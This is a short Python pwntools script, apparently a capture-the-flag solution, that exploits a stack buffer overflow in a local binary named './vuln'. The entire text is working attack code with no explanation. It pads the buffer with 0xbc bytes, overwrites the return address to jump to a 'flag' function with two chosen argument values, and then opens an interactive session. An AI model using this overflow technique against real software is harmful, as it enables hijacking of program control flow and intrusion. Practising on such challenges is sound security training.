from pwn import *

s = process('./vuln')
raw_input('debug')
flag = 0x80485e6 
main = 0x80486b5 
payload = 'a'*0xbc
payload += p32(flag)
payload += p32(main)
payload += p32(0xDEADBEEF)
payload += p32(0xC0DED00D)
s.sendline(payload)
s.interactive()
